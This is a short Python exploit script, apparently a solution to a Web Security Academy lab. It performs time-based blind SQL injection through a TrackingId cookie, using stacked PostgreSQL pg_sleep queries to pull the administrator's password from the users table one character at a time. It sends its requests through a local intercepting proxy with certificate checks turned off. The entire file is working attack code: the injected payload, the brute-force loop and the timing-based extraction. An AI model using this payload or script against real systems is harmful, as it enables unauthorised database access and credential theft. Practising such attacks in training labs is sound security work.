#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

characters = ["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
password = ""

for l in range(1,21):
    for c in characters:
        try:

            url = "https://acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net"
            proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
            headers = {"Host": "acda1f461edf6e8ac0737b1300ff0092.web-security-academy.net",
            "Cookie": "TrackingId=JBJXvGIplT4nR89w'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,"+str(l)+",1)='"+c+"')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=uVH6yFt0c51UZM0c7pTjLDUAExIXJDRJ"}
            r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
            timedelay = str(r.elapsed.total_seconds())[0:2]

            if "." in timedelay:
                pass
            else:
                password += c
                print("[+] Administrator password => "+password)

        except:
             print("An exception occurred")
             exit()